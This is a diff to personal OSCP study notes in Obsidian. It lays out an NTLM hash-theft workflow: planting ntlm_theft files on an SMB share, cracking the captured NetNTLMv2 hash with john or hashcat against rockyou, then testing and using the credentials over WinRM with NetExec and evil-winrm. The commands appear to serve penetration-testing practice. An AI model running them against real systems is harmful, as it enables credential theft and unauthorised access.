@@ -28,4 +28,45 @@ const command = `cd ~/Desktop/Tools/Windows/ntlm_theft/vault && smbclient //${ip
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-smbclient //TARGET_IP/SHARE_NAME -N -c "prompt OFF; mput *"
+```
+prompt OFF
+```
+
+```
+mput *
+```
+
+Go back on SMB server output to copy the hash
+
+```
+echo "[hash]" > hash.txt
+```
+
+```
+john -w=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+or
+
+```
+hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+
+Testing Creds (NetExec)
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `nxc winrm ${ip} -u [USER] -p [PASS]`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+Login using creds (WinRM)
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `evil-winrm -i ${ip} -u [username] -p '[password]'`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
